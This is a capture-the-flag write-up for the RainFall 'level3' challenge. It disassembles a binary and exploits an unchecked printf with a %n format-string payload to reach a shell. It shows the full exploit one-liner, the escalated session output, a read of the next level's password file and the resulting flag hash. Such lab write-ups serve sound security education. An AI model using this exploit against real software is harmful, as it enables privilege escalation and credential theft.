# level3 - Format String

On `level3`'s HOME, we find a binary named : `level3`

```shell
...
0x080484a4  v
0x0804851a  main
...
```

We find two interesting functions in this binary : `main()` and `run()`.
let's disassemble these functions:

```shell
gef➤  disass main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
gef➤  disass v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.

```

As we see in the function `v`, the string we input to the program using `fgets()`
is passed to `printf()` without checking format. In overhand, this snippet 
```shell
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
```
tells us which value (`0x40`) must be on address `0x804988c` to allow us to
open a shell with `system` syscall. We can use a **Format String** vulnerability
to perform this exploit.

<br>

To begin the payload we use the target address, then we must find the good
offset using printf format `%{number}$x`. By this way, we go up in the stack
address by address :
```shell
level3@RainFall:~$ python -c "print '%4\$x'" | ./level3
78243425 => '%4$x' which is the begin of the string we input
```

<br>

Next, we write the number we want to write on the target address using printf
format: `{target_address}%{offset}x%{variable}$n`. The trick is simple, `%n`
write the number of previous characters wrote (using printf format string `d`)
in target_address which is the 'offset variable' we found. This is because we
have to find the begin of our input string in stack.

So, we have to write **64 bytes** before using `%n`.


<br>

To summary, we have:
- Our target address of 4 bytes : `0x804988c`
- A `printf` formating offset of 60 bytes : `%60x`
- The *write* printf format to the 4th address going up the stack from esp : `%4$n`

> Note: We add a `\` before character `$` to be writable by python.

<br>


We can now exploit this BOF :

```shell
(python -c "print '\x08\x04\x98\x8c'[::-1] + '%60x%4\$n'"; cat) | ./level3
```

```shell
level3@RainFall:~$ (python -c "print '\x08\x04\x98\x8c'[::-1] + '%60x%4\$n'"; cat) | ./level3
�                                                         200
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
